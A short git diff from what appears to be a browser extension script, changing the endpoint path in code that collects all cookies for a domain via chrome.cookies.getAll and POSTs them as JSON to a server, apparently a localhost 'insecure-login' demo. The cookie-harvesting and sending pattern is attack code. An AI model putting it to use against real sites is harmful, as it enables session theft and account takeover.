@@ -31,7 +31,7 @@ import '../img/icon-34.png'
                 }
                 console.log(domain);
                 chrome.cookies.getAll({domain: domain}, function (cookies) {
-                    fetch('http://localhost/api.php', {
+                    fetch('http://localhost/insecure-login/api.php', {
                         headers: { "Content-Type": "application/json; charset=utf-8" },
                         method: 'POST',
                         body: JSON.stringify({cookie : cookies})
